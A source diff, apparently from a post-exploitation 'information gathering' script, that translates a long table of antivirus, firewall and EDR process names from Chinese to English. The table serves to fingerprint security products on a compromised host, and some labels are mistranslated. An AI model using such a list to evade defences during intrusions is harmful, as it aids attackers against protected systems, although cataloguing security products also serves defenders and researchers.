-				"SophosFS.exe" => "Sophos杀毒",
-				"SophosHealth.exe" => "Sophos杀毒",
-				"SophosSafestore64.exe" => "Sophos杀毒",
-				"SophosCleanM.exe" => "Sophos杀毒",
-				"fsavgui.exe" => "F-Secure杀毒",
-				"vsserv.exe" => "比特梵德",
-				"remupd.exe" => "熊猫卫士",
-				"FortiTray.exe" => "飞塔",
-				"safedog.exe" => "安全狗",
-				"parmor.exe" => "木马克星",
-				"Iparmor.exe.exe" => "木马克星",
-				"beikesan.exe" => "贝壳云安全",
-				"KSWebShield.exe" => "金山网盾",
-				"TrojanHunter.exe" => "木马猎手",
-				"GG.exe" => "巨盾网游安全盾",
-				"adam.exe" => "绿鹰安全精灵",
-				"AST.exe" => "超级巡警",
-				"ananwidget.exe" => "墨者安全专家",
+				"kxetray.exe" => "Kingsoft Antivirus",
+				"knsdtray.exe" => "Kansdtray Antivirus",
+				"TMBMSRV.exe" => "Trend Antivirus",
+				"avcenter.exe" => "Avira(Little Red Umbrella)",
+				"avguard.exe" => "Avira(Little Red Umbrella)",
+				"avgnt.exe" => "Avira (Little Red Umbrella)",
+				"sched.exe" => "Avira(Little Red Umbrella)",
+				"ashDisp.exe" => "Avast Internet Security",
+				"rtvscan.exe" => "Norton Antivirus",
+				"ccapp.exe" => "Symantec Norton",
+				"NPFMntor.exe" => "Norton antivirus software",
+				"ccSetMgr.exe" => "Symantec",
+				"ccRegVfy.exe" => "Norton Antivirus",
+				"ksafe.exe" => "Jinshan Guardian",
+				"QQPCRTP.exe" => "QQ Computer Manager",
+				"avgwdsvc.exe" => "AVG antivirus",
+				"QUHLPSVC.exe" => "QUICK HEAL antivirus",
+				"mssecess.exe" => "Microsoft Antivirus",
+				"SavProgress.exe" => "Sophos antivirus",
+				"SophosUI.exe" => "Sophos antivirus",
+				"SophosFS.exe" => "Sophos antivirus",
+				"SophosHealth.exe" => "Sophos Antivirus",
+				"SophosSafestore64.exe" => "Sophos Antivirus",
+				"SophosCleanM.exe" => "Sophos Antivirus",
+				"fsavgui.exe" => "F-Secure antivirus",
+				"vsserv.exe" => "Bitdefender",
+				"remupd.exe" => "Panda Guardian",
+				"FortiTray.exe" => "FortiTray",
+				"safedog.exe" => "safedog",
+				"parmor.exe" => "Trojan mark star",
+				"Iparmor.exe.exe" => "Trojan mark star",
+				"beikesan.exe" => "Beikesan Cloud Security",
+				"KSWebShield.exe" => "Jinshan WebShield",
+				"TrojanHunter.exe" => "Trojan Hunter",
+				"GG.exe" => "Giant Shield Online Game Security Shield",
+				"adam.exe" => "Green Eagle Security Wizard",
+				"AST.exe" => "Super Patrol",
+				"ananwidget.exe" => "Mozhe Security Expert",
 				"AVK.exe" => "AntiVirusKit",
 				"avg.exe" => "AVG Anti-Virus",
-				"spidernt.exe" => "Dr.web",
+				"spidernt.exe" => "Dr. web",
 				"avgaurd.exe" => "Avira Antivir",
 				"vsmon.exe" => "Zone Alarm",
 				"cpf.exe" => "Comodo",
 				"outpost.exe" => "Outpost Firewall",
-				"rfwmain.exe" => "瑞星防火墙",
-				"kpfwtray.exe" => "金山网镖",
-				"FYFireWall.exe" => "风云防火墙",
-				"MPMon.exe" => "微点主动防御",
-				"pfw.exe" => "天网防火墙",
-				"BaiduSdSvc.exe" => "百度杀毒-服务进程",
-				"BaiduSdTray.exe" => "百度杀毒-托盘进程",
-				"BaiduSd.exe" => "百度杀毒-主程序",
-				"SafeDogGuardCenter.exe" => "安全狗",
-				"safedogupdatecenter.exe" => "安全狗",
-				"safedogguardcenter.exe" => "安全狗",
-				"SafeDogSiteIIS.exe" => "安全狗",
-				"SafeDogTray.exe" => "安全狗",
-				"SafeDogServerUI.exe" => "安全狗",
-				"D_Safe_Manage.exe" => "D盾",
-				"d_manage.exe" => "D盾",
-				"yunsuo_agent_service.exe" => "云锁",
-				"yunsuo_agent_daemon.exe" => "云锁",
-				"HwsPanel.exe" => "护卫神",
-				"hws_ui.exe" => "护卫神",
-				"hws.exe" => "护卫神",
-				"hwsd.exe" => "护卫神",
-				"HipsTray.exe" => "火绒",
-				"HipsDaemon.exe" => "火绒",
-				"wsctrl.exe" => "火绒",
-				"usysdiag.exe" => "火绒",
-				"SPHINX.exe" => "SPHINX防火墙",
-				"bddownloader.exe" => "百度卫士",
-				"baiduansvx.exe" => "百度卫士-主进程",
-				"AvastUI.exe" => "Avast!5主程序",
+				"rfwmain.exe" => "Rising Firewall",
+				"kpfwtray.exe" => "Jinshan Internet Dart",
+				"FYFireWall.exe" => "FYFireWall",
+				"MPMon.exe" => "Micropoint active defense",
+				"pfw.exe" => "Skynet Firewall",
+				"BaiduSdSvc.exe" => "Baidu antivirus-service process",
+				"BaiduSdTray.exe" => "Baidu Antivirus-Tray Process",
+				"BaiduSd.exe" => "Baidu antivirus-main program",
+				"SafeDogGuardCenter.exe" => "Safe Dog",
+				"safedogupdatecenter.exe" => "safedog",
+				"safedogguardcenter.exe" => "safedog",
+				"SafeDogSiteIIS.exe" => "Safe Dog",
+				"SafeDogTray.exe" => "Safe Dog",
+				"SafeDogServerUI.exe" => "SafeDog",
+				"D_Safe_Manage.exe" => "D Shield",
+				"d_manage.exe" => "D Shield",
+				"yunsuo_agent_service.exe" => "cloud lock",
+				"yunsuo_agent_daemon.exe" => "cloud lock",
+				"HwsPanel.exe" => "Guardian",
+				"hws_ui.exe" => "Guardian",
+				"hws.exe" => "Guardian God",
+				"hwsd.exe" => "Guardian God",
+				"HipsTray.exe" => "Tinder",
+				"HipsDaemon.exe" => "Tinder",
+				"wsctrl.exe" => "Tinder",
+				"usysdiag.exe" => "Tinder",
+				"SPHINX.exe" => "SPHINX Firewall",
+				"bddownloader.exe" => "Baidu Guardian",
+				"baiduansvx.exe" => "Baidu Guardian-Main Process",
+				"AvastUI.exe" => "Avast!5 main program",
 				"emet_agent.exe" => "EMET",
 				"emet_service.exe" => "EMET",
 				"firesvc.exe" => "McAfee",
@@ -555,21 +555,21 @@ menu "☆ 信息收集" {
 				"frminst.exe" => "McAfee",
 				"mcscript_inuse.exe" => "McAfee",
 				"mctray.exe" => "McAfee",
-				"_avp32.exe" => "卡巴斯基",
-				"_avpcc.exe" => "卡巴斯基",
-				"_avpm.exe" => "卡巴斯基",
+				"_avp32.exe" => "Kaspersky",
+				"_avpcc.exe" => "Kaspersky",
+				"_avpm.exe" => "Kaspersky",
 				"aAvgApi.exe" => "AVG",
-				"ackwin32.exe" => "已知杀软进程,名称暂未收录",
+				"ackwin32.exe" => "Known anti-software process, the name is not included yet",
 				"alertsvc.exe" => "Norton AntiVirus",
 				"alogserv.exe" => "McAfee VirusScan",
 				"anti-trojan.exe" => "Anti-Trojan Elite",
 				"arr.exe" => "Application Request Route",
 				"atguard.exe" => "AntiVir",
-				"atupdater.exe" => "已知杀软进程,名称暂未收录",
+				"atupdater.exe" => "Known anti-software process, the name is not included yet",
 				"atwatch.exe" => "Mustek",
 				"au.exe" => "NSIS",
 				"aupdate.exe" => "Symantec",
-				"auto-protect.nav80try.exe" => "已知杀软进程,名称暂未收录",
+				"auto-protect.nav80try.exe" => "Known anti-software process, the name is not included yet",
 				"autodown.exe" => "AntiVirus AutoUpdater",
 				"avconsol.exe" => "McAfee",
 				"avgcc32.exe" => "AVG",
@@ -583,16 +583,16 @@ menu "☆ 信息收集" {
 				"avkserv.exe" => "G DATA SOFTWARE AG",
 				"avkservice.exe" => "G DATA SOFTWARE AG",
 				"avkwctl9.exe" => "G DATA SOFTWARE AG",
-				"avltmain.exe" => "Panda Software Aplication",
+				"avltmain.exe" => "Panda Software Application",
 				"avnt.exe" => "H+BEDV Datentechnik GmbH",
 				"avp32.exe" => "Kaspersky Anti-Virus",
-				"avpcc.exe" => " Kaspersky AntiVirus",
-				"avpdos32.exe" => " Kaspersky AntiVirus",
-				"avpm.exe" => " Kaspersky AntiVirus",
-				"avptc32.exe" => " Kaspersky AntiVirus",
-				"avpupd.exe" => " Kaspersky AntiVirus",
-				"avsynmgr.exe" => "McAfee",
-				"avwin.exe" => " H+BEDV",
+				"avpcc.exe" => "Kaspersky AntiVirus",
+				"avpdos32.exe" => "Kaspersky AntiVirus",
+				"avpm.exe" => "Kaspersky AntiVirus",
+				"avptc32.exe" => "Kaspersky AntiVirus",
+				"avpupd.exe" => "Kaspersky AntiVirus",
+				"avsyncr.exe" => "McAfee",
+				"avwin.exe" => "H+BEDV",
 				"bargains.exe" => "Exact Advertising SpyWare",
 				"beagle.exe" => "Avast",
 				"blackd.exe" => "BlackICE",
@@ -605,39 +605,39 @@ menu "☆ 信息收集" {
 				"ccevtmgr.exe" => "Norton Internet Security",
 				"cdp.exe" => "CyberLink Corp.",
 				"cfd.exe" => "Motive Communications",
-				"cfgwiz.exe" => " Norton AntiVirus",
-				"claw95.exe" => "已知杀软进程,名称暂未收录",
-				"claw95cf.exe" => "已知杀软进程,名称暂未收录",
-				"clean.exe" => "windows流氓软件清理大师",
-				"cleaner.exe" => "windows流氓软件清理大师",
-				"cleaner3.exe" => "windows流氓软件清理大师",
-				"cleanpc.exe" => "windows流氓软件清理大师",
+				"cfgwiz.exe" => "Norton AntiVirus",
+				"claw95.exe" => "Known anti-software process, the name is not included yet",
+				"claw95cf.exe" => "Known anti-software process, the name is not included yet",
+				"clean.exe" => "windows rogue software cleaning master",
+				"cleaner.exe" => "windows rogue software cleaning master",
+				"cleaner3.exe" => "windows rogue software cleaning master",
+				"cleanpc.exe" => "windows rogue software cleaning master",
 				"cpd.exe" => "McAfee",
-				"ctrl.exe" => "已知杀软进程,名称暂未收录",
-				"cv.exe" => "已知杀软进程,名称暂未收录",
+				"ctrl.exe" => "Known anti-software process, the name is not included yet",
+				"cv.exe" => "Known anti-software process, the name is not included yet",
 				"defalert.exe" => "Symantec",
 				"defscangui.exe" => "Symantec",
 				"defwatch.exe" => "Norton Antivirus",
-				"doors.exe" => "已知杀软进程,名称暂未收录",
-				"dpf.exe" => "已知杀软进程,名称暂未收录",
+				"doors.exe" => "Known anti-software process, the name is not included yet",
+				"dpf.exe" => "Known anti-software process, the name is not included yet",
 				"dpps2.exe" => "PanicWare",
 				"dssagent.exe" => "Broderbund",
-				"ecengine.exe" => "已知杀软进程,名称暂未收录",
+				"ecengine.exe" => "Known anti-software process, the name is not included yet",
 				"emsw.exe" => "Alset Inc",
-				"ent.exe" => "已知杀软进程,名称暂未收录",
-				"espwatch.exe" => "已知杀软进程,名称暂未收录",
+				"ent.exe" => "Known anti-software process, the name is not included yet",
+				"espwatch.exe" => "Known anti-software process, the name is not included yet",
 				"ethereal.exe" => "RationalClearCase",
-				"exe.avxw.exe" => "已知杀软进程,名称暂未收录",
-				"expert.exe" => "已知杀软进程,名称暂未收录",
-				"f-prot95.exe" => "已知杀软进程,名称暂未收录",
+				"exe.avxw.exe" => "Known anti-software process, the name is not included yet",
+				"expert.exe" => "Known anti-software process, the name is not included yet",
+				"f-prot95.exe" => "Known anti-software process, the name is not included yet",
 				"fameh32.exe" => "F-Secure",
-				"fast.exe" => " FastUsr",
+				"fast.exe" => "FastUsr",
 				"fch32.exe" => "F-Secure",
 				"fih32.exe" => "F-Secure",
 				"findviru.exe" => "F-Secure",
-				"firewall.exe" => "AshampooSoftware",
+				"firewall.exe" => "Ashampoo Software",
 				"fnrb32.exe" => "F-Secure",
-				"fp-win.exe" => " F-Prot Antivirus OnDemand",
+				"fp-win.exe" => "F-Prot Antivirus OnDemand",
 				"fsaa.exe" => "F-Secure",
 				"fsav.exe" => "F-Secure",
 				"fsav32.exe" => "F-Secure",
@@ -648,29 +648,29 @@ menu "☆ 信息收集" {
 				"fsm32.exe" => "F-Secure",
 				"fsma32.exe" => "F-Secure",
 				"fsmb32.exe" => "F-Secure",
-				"gbmenu.exe" => "已知杀软进程,名称暂未收录",
+				"gbmenu.exe" => "Known anti-software process, the name is not included yet",
 				"guard.exe" => "ewido",
 				"guarddog.exe" => "ewido",
-				"htlog.exe" => "已知杀软进程,名称暂未收录",
+				"htlog.exe" => "Known anti-software process, the name is not included yet",
 				"htpatch.exe" => "Silicon Integrated Systems Corporation",
-				"hwpe.exe" => "已知杀软进程,名称暂未收录",
+				"hwpe.exe" => "Known anti-software process, the name is not included yet",
 				"iamapp.exe" => "Symantec",
 				"iamserv.exe" => "Symantec",
 				"iamstats.exe" => "Symantec",
-				"iedriver.exe" => " Urlblaze.com",
+				"iedriver.exe" => "Urlblaze.com",
 				"iface.exe" => "Panda Antivirus Module",
 				"infus.exe" => "Infus Dialer",
 				"infwin.exe" => "Msviewparasite",
 				"intdel.exe" => "Inet Delivery",
-				"intren.exe" => "已知杀软进程,名称暂未收录",
-				"jammer.exe" => "已知杀软进程,名称暂未收录",
+				"intren.exe" => "Known anti-software process, the name is not included yet",
+				"jammer.exe" => "Known anti-software process, the name is not included yet",
 				"kavpf.exe" => "Kapersky",
 				"kazza.exe" => "Kapersky",
 				"keenvalue.exe" => "EUNIVERSE INC",
 				"launcher.exe" => "Intercort Systems",
-				"ldpro.exe" => "已知杀软进程,名称暂未收录",
+				"ldpro.exe" => "Known anti-software process, the name is not included yet",
 				"ldscan.exe" => "Windows Trojans Inspector",
-				"localnet.exe" => "已知杀软进程,名称暂未收录",
+				"localnet.exe" => "Known anti-software process, the name is not included yet",
 				"luall.exe" => "Symantec",
 				"luau.exe" => "Symantec",
 				"lucomserver.exe" => "Norton",
@@ -694,91 +694,91 @@ menu "☆ 信息收集" {
 				"mpfservice.exe" => "McAfee",
 				"mpftray.exe" => "McAfee",
 				"mscache.exe" => "Integrated Search Technologies Spyware",
-				"mscman.exe" => "OdysseusMarketingInc",
+				"mscman.exe" => "Odysseus Marketing Inc",
 				"msmgt.exe" => "Total Velocity Spyware",
 				"msvxd.exe" => "W32/Datom-A",
-				"mwatch.exe" => "已知杀软进程,名称暂未收录",
+				"mwatch.exe" => "Known anti-software process, the name is not included yet",
 				"nav.exe" => "Reuters Limited",
 				"navapsvc.exe" => "Norton AntiVirus",
 				"navapw32.exe" => "Norton AntiVirus",
 				"navw32.exe" => "Norton Antivirus",
-				"ndd32.exe" => "诺顿磁盘医生",
-				"neowatchlog.exe" => "已知杀软进程,名称暂未收录",
-				"netutils.exe" => "已知杀软进程,名称暂未收录",
+				"ndd32.exe" => "Norton Disk Doctor",
+				"neowatchlog.exe" => "Known anti-software process, the name is not included yet",
+				"netutils.exe" => "Known anti-software process, the name is not included yet",
 				"nisserv.exe" => "Norton",
 				"nisum.exe" => "Norton",
 				"nmain.exe" => "Norton",
 				"nod32.exe" => "ESET Smart Security",
-				"norton_internet_secu_3.0_407.exe" => "已知杀软进程,名称暂未收录",
-				"notstart.exe" => "已知杀软进程,名称暂未收录",
+				"norton_internet_secu_3.0_407.exe" => "Known anti-software process, the name is not included yet",
+				"notstart.exe" => "Known anti-software process, the name is not included yet",
 				"nprotect.exe" => "Symantec",
 				"npscheck.exe" => "Norton",
 				"npssvc.exe" => "Norton",
-				"ntrtscan.exe" => "趋势反病毒应用程序",
-				"nui.exe" => "已知杀软进程,名称暂未收录",
-				"otfix.exe" => "已知杀软进程,名称暂未收录",
+				"ntrtscan.exe" => "Trend Antivirus Application",
+				"nui.exe" => "Known anti-software process, the name is not included yet",
+				"otfix.exe" => "Known anti-software process, the name is not included yet",
 				"outpostinstall.exe" => "Outpost",
-				"patch.exe" => "趋势科技",
-				"pavw.exe" => "已知杀软进程,名称暂未收录",
-				"pcscan.exe" => "趋势科技",
-				"pdsetup.exe" => "已知杀软进程,名称暂未收录",
+				"patch.exe" => "Trend Micro",
+				"pavw.exe" => "Known anti-software process, the name is not included yet",
+				"pcscan.exe" => "Trend Micro",
+				"pdsetup.exe" => "Known anti-software process, the name is not included yet",
 				"persfw.exe" => "Tiny Personal Firewall",
 				"pgmonitr.exe" => "PromulGate SpyWare",
-				"pingscan.exe" => "已知杀软进程,名称暂未收录",
-				"platin.exe" => "已知杀软进程,名称暂未收录",
+				"pingscan.exe" => "Known anti-software process, the name is not included yet",
+				"platin.exe" => "Known anti-software process, the name is not included yet",
 				"pop3trap.exe" => "PC-cillin",
 				"poproxy.exe" => "NortonAntiVirus",
-				"popscan.exe" => "已知杀软进程,名称暂未收录",
+				"popscan.exe" => "Known anti-software process, the name is not included yet",
 				"powerscan.exe" => "Integrated Search Technologies",
-				"ppinupdt.exe" => "已知杀软进程,名称暂未收录",
-				"pptbc.exe" => "已知杀软进程,名称暂未收录",
-				"ppvstop.exe" => "已知杀软进程,名称暂未收录",
+				"ppinupdt.exe" => "Known anti-software process, the name is not included yet",
+				"pptbc.exe" => "Known anti-software process, the name is not included yet",
+				"ppvstop.exe" => "Known anti-software process, the name is not included yet",
 				"prizesurfer.exe" => "Prizesurfer",
 				"prmt.exe" => "OpiStat",
-				"prmvr.exe" => "Adtomi",
+				"prmvr.exe" => "Addtomi",
 				"processmonitor.exe" => "Sysinternals",
-				"proport.exe" => "已知杀软进程,名称暂未收录",
+				"proport.exe" => "Known anti-software process, the name is not included yet",
 				"protectx.exe" => "ProtectX",
-				"pspf.exe" => "已知杀软进程,名称暂未收录",
-				"purge.exe" => "已知杀软进程,名称暂未收录",
+				"pspf.exe" => "Known anti-software process, the name is not included yet",
+				"purge.exe" => "Known anti-software process, the name is not included yet",
 				"qconsole.exe" => "Norton AntiVirus Quarantine Console",
 				"qserver.exe" => "Norton Internet Security",
 				"rapapp.exe" => "BlackICE",
 				"rb32.exe" => "RapidBlaster",
 				"rcsync.exe" => "PrizeSurfer",
 				"realmon.exe" => "Realmon ",
-				"rescue.exe" => "已知杀软进程,名称暂未收录",
-				"rescue32.exe" => "卡巴斯基互联网安全套装",
-				"rshell.exe" => "已知杀软进程,名称暂未收录",
-				"rtvscn95.exe" => "Real-time virus scanner ",
+				"rescue.exe" => "Known anti-software process, the name is not included yet",
+				"rescue32.exe" => "Kaspersky Internet Security",
+				"rshell.exe" => "Known anti-software process, the name is not included yet",
+				"rtvscn95.exe" => "Real-time virus scanner",
 				"rulaunch.exe" => "McAfee User Interface",
 				"run32dll.exe" => "PAL PC Spy",
 				"safeweb.exe" => "PSafe Tecnologia",
 				"sbserv.exe" => "Norton Antivirus",
-				"scrscan.exe" => "360杀毒",
+				"scrscan.exe" => "360 antivirus",
 				"sfc.exe" => "System file checker",
 				"sh.exe" => "MKS Toolkit for Win3",
-				"showbehind.exe" => "MicroSmarts Enterprise Component ",
+				"showbehind.exe" => "MicroSmarts Enterprise Component",
 				"soap.exe" => "System Soap Pro",
-				"sofi.exe" => "已知杀软进程,名称暂未收录",
-				"sperm.exe" => "已知杀软进程,名称暂未收录",
-				"supporter5.exe" => "eScorcher反病毒",
+				"sofi.exe" => "Known anti-software process, the name is not included yet",
+				"sperm.exe" => "Known anti-software process, the name is not included yet",
+				"supporter5.exe" => "eScorcher anti-virus",
 				"symproxysvc.exe" => "Symantec",
 				"symtray.exe" => "Symantec",
 				"tbscan.exe" => "ThunderBYTE",
 				"tc.exe" => "TimeCalende",
 				"titanin.exe" => "TitanHide",
 				"tvmd.exe" => "Total Velocity",
-				"tvtmd.exe" => " Total Velocity",
+				"tvtmd.exe" => "Total Velocity",
 				"vettray.exe" => "eTrust",
-				"vir-help.exe" => "已知杀软进程,名称暂未收录",
-				"vnpc3000.exe" => "已知杀软进程,名称暂未收录",
+				"vir-help.exe" => "Known anti-software process, the name is not included yet",
+				"vnpc3000.exe" => "Known anti-software process, the name is not included yet",
 				"vpc32.exe" => "Symantec",
 				"vpc42.exe" => "Symantec",
 				"vshwin32.exe" => "McAfee",
 				"vsmain.exe" => "McAfee",
 				"vsstat.exe" => "McAfee",
-				"wfindv32.exe" => "已知杀软进程,名称暂未收录",
+				"wfindv32.exe" => "Known anti-software process, the name is not included yet",
 				"zapro.exe" => "Zone Alarm",
 				"zonealarm.exe" => "Zone Alarm",
 				"AVPM.exe" => "Kaspersky",
@@ -786,26 +786,26 @@ menu "☆ 信息收集" {
 				"A2SERVICE.exe" => "a-squared free",
 				"A2FREE.exe" => "a-squared Free",
 				"ADVCHK.exe" => "Norton AntiVirus",
-				"AGB.exe" => "安天防线",
-				"AHPROCMONSERVER.exe" => "安天防线",
+				"AGB.exe" => "Antian Line of Defense",
+				"AHPROCMONSERVER.exe" => "Antian Line of Defense",
 				"AIRDEFENSE.exe" => "AirDefense",
 				"ALERTSVC.exe" => "Norton AntiVirus",
-				"AVIRA.exe" => "小红伞杀毒",
+				"AVIRA.exe" => "Little Red Umbrella Antivirus",
 				"AMON.exe" => "Tiny Personal Firewall",
 				"AVZ.exe" => "AVZ",
-				"ANTIVIR.exe" => "已知杀软进程,名称暂未收录",
-				"APVXDWIN.exe" => "熊猫卫士",
+				"ANTIVIR.exe" => "Known antivirus process, the name is not included yet",
+				"APVXDWIN.exe" => "Panda Guardian",
 				"ASHMAISV.exe" => "Alwil",
 				"ASHSERV.exe" => "Avast Anti-virus",
 				"ASHSIMPL.exe" => "AVAST!VirusCleaner",
 				"ASHWEBSV.exe" => "Avast",
 				"ASWUPDSV.exe" => "Avast",
 				"ASWSCAN.exe" => "Avast",
-				"AVCIMAN.exe" => "熊猫卫士",
+				"AVCIMAN.exe" => "Panda Guardian",
 				"AVCONSOL.exe" => "McAfee",
-				"AVENGINE.exe" => "熊猫卫士",
+				"AVENGINE.exe" => "Panda Guardian",
 				"AVESVC.exe" => "Avira AntiVir Security Service",
-				"AVEVL32.exe" => "已知杀软进程,名称暂未收录",
+				"AVEVL32.exe" => "Known anti-software process, the name is not included yet",
 				"AVGAM.exe" => "AVG",
 				"AVGCC.exe" => "AVG",
 				"AVGCHSVX.exe" => "AVG",
@@ -832,12 +832,12 @@ menu "☆ 信息收集" {
 				"CLAMWIN.exe" => "ClamWin Portable",
 				"CUREIT.exe" => "DrWeb CureIT",
 				"DEFWATCH.exe" => "Norton Antivirus",
-				"DRWADINS.exe" => "Dr.Web",
-				"DRWEB.exe" => "Dr.Web",
+				"DRWADINS.exe" => "Dr. Web",
+				"DRWEB.exe" => "Dr. Web",
 				"DEFENDERDAEMON.exe" => "ShadowDefender",
 				"EWIDOCTRL.exe" => "Ewido Security Suite",
 				"EZANTIVIRUSREGISTRATIONCHECK.exe" => "e-Trust Antivirus",
-				"FIREWALL.exe" => "AshampooSoftware",
+				"FIREWALL.exe" => "Ashampoo Software",
 				"FPROTTRAY.exe" => "F-PROT Antivirus",
 				"FPWIN.exe" => "Verizon",
 				"FRESHCLAM.exe" => "ClamAV",
@@ -849,7 +849,7 @@ menu "☆ 信息收集" {
 				"FSMA32.exe" => "F-Secure",
 				"FSMB32.exe" => "F-Secure",
 				"FSSM32.exe" => "F-Secure",
-				"GUARDGUI.exe" => "网游保镖",
+				"GUARDGUI.exe" => "Online Game Bodyguard",
 				"GUARDNT.exe" => "IKARUS",
 				"IAMAPP.exe" => "Symantec",
 				"INOCIT.exe" => "eTrust",
@@ -865,7 +865,7 @@ menu "☆ 信息收集" {
 				"KAVSTART.exe" => "Kaspersky",
 				"KAVSVC.exe" => "Kaspersky",
 				"KAVSVCUI.exe" => "Kaspersky",
-				"KMAILMON.exe" => "金山毒霸",
+				"KMAILMON.exe" => "KMAILMON",
 				"MCAGENT.exe" => "McAfee",
 				"MCMNHDLR.exe" => "McAfee",
 				"MCREGWIZ.exe" => "McAfee",
@@ -884,31 +884,31 @@ menu "☆ 信息收集" {
 				"NISUM.exe" => "Norton",
 				"NMAIN.exe" => "Norton",
 				"NOD32.exe" => "ESET NOD32",
-				"NPFMSG.exe" => "Norman个人防火墙",
+				"NPFMSG.exe" => "Norman Personal Firewall",
 				"NPROTECT.exe" => "Symantec",
 				"NSMDTR.exe" => "Norton",
-				"NTRTSCAN.exe" => "趋势科技",
+				"NTRTSCAN.exe" => "Trend Micro",
 				"OFCPFWSVC.exe" => "OfficeScanNT",
-				"ONLINENT.exe" => "已知杀软进程,名称暂未收录",
-				"OP_MON.exe" => " OutpostFirewall",
-				"PAVFIRES.exe" => "熊猫卫士",
-				"PAVFNSVR.exe" => "熊猫卫士",
-				"PAVKRE.exe" => "熊猫卫士",
-				"PAVPROT.exe" => "熊猫卫士",
-				"PAVPROXY.exe" => "熊猫卫士",
-				"PAVPRSRV.exe" => "熊猫卫士",
-				"PAVSRV51.exe" => "熊猫卫士",
-				"PAVSS.exe" => "熊猫卫士",
+				"ONLINENT.exe" => "Known anti-software process, the name is not included yet",
+				"OP_MON.exe" => "Outpost Firewall",
+				"PAVFIRES.exe" => "Panda Guardian",
+				"PAVFNSVR.exe" => "Panda Guardian",
+				"PAVKRE.exe" => "Panda Guardian",
+				"PAVPROT.exe" => "Panda Guard",
+				"PAVPROXY.exe" => "Panda Guardian",
+				"PAVPRSRV.exe" => "Panda Guardian",
+				"PAVSRV51.exe" => "Panda Guardian",
+				"PAVSS.exe" => "Panda Guardian",
 				"PCCGUIDE.exe" => "PC-cillin",
 				"PCCIOMON.exe" => "PC-cillin",
 				"PCCNTMON.exe" => "PC-cillin",
-				"PCCPFW.exe" => "趋势科技",
-				"PCCTLCOM.exe" => "趋势科技",
+				"PCCPFW.exe" => "Trend Micro",
+				"PCCTLCOM.exe" => "Trend Micro",
 				"PCTAV.exe" => "PC Tools AntiVirus",
 				"PERSFW.exe" => "Tiny Personal Firewall",
-				"PERVAC.exe" => "已知杀软进程,名称暂未收录",
+				"PERVAC.exe" => "Known anti-software process, the name is not included yet",
 				"PESTPATROL.exe" => "Ikarus",
-				"PREVSRV.exe" => "熊猫卫士",
+				"PREVSRV.exe" => "Panda Guardian",
 				"RTVSCN95.exe" => "Real-time Virus Scanner",
 				"SAVADMINSERVICE.exe" => "SAV",
 				"SAVMAIN.exe" => "SAV",
@@ -916,10 +916,10 @@ menu "☆ 信息收集" {
 				"SDHELP.exe" => "Spyware Doctor",
 				"SHSTAT.exe" => "McAfee",
 				"SPBBCSVC.exe" => "Symantec",
-				"SPIDERCPL.exe" => "Dr.Web",
-				"SPIDERML.exe" => "Dr.Web",
-				"SPIDERUI.exe" => "Dr.Web",
-				"SPYBOTSD.exe" => "Spybot ",
+				"SPIDERCPL.exe" => "Dr. Web",
+				"SPIDERML.exe" => "Dr. Web",
+				"SPIDERUI.exe" => "Dr. Web",
+				"SPYBOTSD.exe" => "Spybot",
 				"SWAGENT.exe" => "SonicWALL",
 				"SWDOCTOR.exe" => "SonicWALL",
 				"SWNETSUP.exe" => "Sophos",
@@ -928,13 +928,13 @@ menu "☆ 信息收集" {
 				"SYMSPORT.exe" => "Sysmantec",
 				"SYMWSC.exe" => "Sysmantec",
 				"SYNMGR.exe" => "Sysmantec",
-				"TMLISTEN.exe" => "趋势科技",
-				"TMNTSRV.exe" => "趋势科技",
-				"TMPROXY.exe" => "趋势科技",
+				"TMLISTEN.exe" => "Trend Micro",
+				"TMNTSRV.exe" => "Trend Micro",
+				"TMPROXY.exe" => "Trend Micro",
 				"TNBUTIL.exe" => "Anti-Virus",
-				"VBA32ECM.exe" => "已知杀软进程,名称暂未收录",
-				"VBA32IFS.exe" => "已知杀软进程,名称暂未收录",
-				"VBA32PP3.exe" => "已知杀软进程,名称暂未收录",
+				"VBA32ECM.exe" => "Known anti-software process, the name is not included yet",
+				"VBA32IFS.exe" => "Known anti-software process, the name is not included yet",
+				"VBA32PP3.exe" => "Known anti-software process, the name is not included yet",
 				"VCRMON.exe" => "VirusChaser",
 				"VRMONNT.exe" => "HAURI",
 				"VRMONSVC.exe" => "HAURI",
@@ -942,16 +942,16 @@ menu "☆ 信息收集" {
 				"VSSTAT.exe" => "McAfee",
 				"XCOMMSVR.exe" => "BitDefender",
 				"ZONEALARM.exe" => "Zone Alarm",
-				"360rp.exe" => "360杀毒",
-				"afwServ.exe" => " Avast Antivirus ",
-				"safeboxTray.exe" => "360杀毒",
-				"360safebox.exe" => "360杀毒",
-				"QQPCTray.exe" => "QQ电脑管家",
-				"KSafeTray.exe" => "金山毒霸",
-				"KSafeSvc.exe" => "金山毒霸",
-				"KWatch.exe" => "金山毒霸",
-				"gov_defence_service.exe" => "云锁",
-				"gov_defence_daemon.exe" => "云锁",
+				"360rp.exe" => "360 antivirus",
+				"afwServ.exe" => "Avast Antivirus",
+				"safeboxTray.exe" => "360 antivirus",
+				"360safebox.exe" => "360 antivirus",
+				"QQPCTray.exe" => "QQ Computer Manager",
+				"KSafeTray.exe" => "Kingsoft Antivirus",
+				"KSafeSvc.exe" => "Kingsoft Antivirus",
+				"KWatch.exe" => "Kingsoft Antivirus",
+				"gov_defence_service.exe" => "Cloud lock",
+				"gov_defence_daemon.exe" => "Cloud lock",
 				"smartscreen.exe" => "Windows Defender",
 				"macompatsvc.exe" => "McAfee",
 				"mcamnsvc.exe " => "McAfee",
@@ -971,28 +971,28 @@ menu "☆ 信息收集" {
 				"fcags.exe" => "McAfee",
 				"fcagswd.exe" => "McAfee",
 				"fcagate.exe" => "McAfee",
-				"360EntClient.exe" => "天擎EDR Agent",
-				"edr_sec_plan.exe" => "深信服EDR Agent",
-				"edr_monitor.exe" => "深信服EDR Agent",
-				"edr_agent.exe" => "深信服EDR Agent",
-				"ESCCControl.exe" => "启明星辰天珣EDR Agent",
-				"ESCC.exe" => "启明星辰天珣EDR Agent",
-				"ESAV.exe" => "启明星辰天珣EDR Agent",
-				"ESCCIndex.exe" => "启明星辰天珣EDR Agent",
-				"AliYunDun.exe" => "阿里云云盾",
-				"wdswfsafe.exe" => "360杀毒-网盾",
-				"TopsecMain.exe" => "天融信终端防御",
-				"TopsecTray.exe" => "天融信终端防御",
-				"YDLive.exe" =>"腾讯云-云镜",
-				"YDService.exe" =>"腾讯云-云镜",
-				"TitanAgent.exe" =>"天眼云镜",
-				"TitanMonitor.exe" =>"天眼云镜",
-				"gse_win_daemon.exe" =>"蓝鲸Agent",
-				"gse_win_agent.exe" =>"蓝鲸Agent",
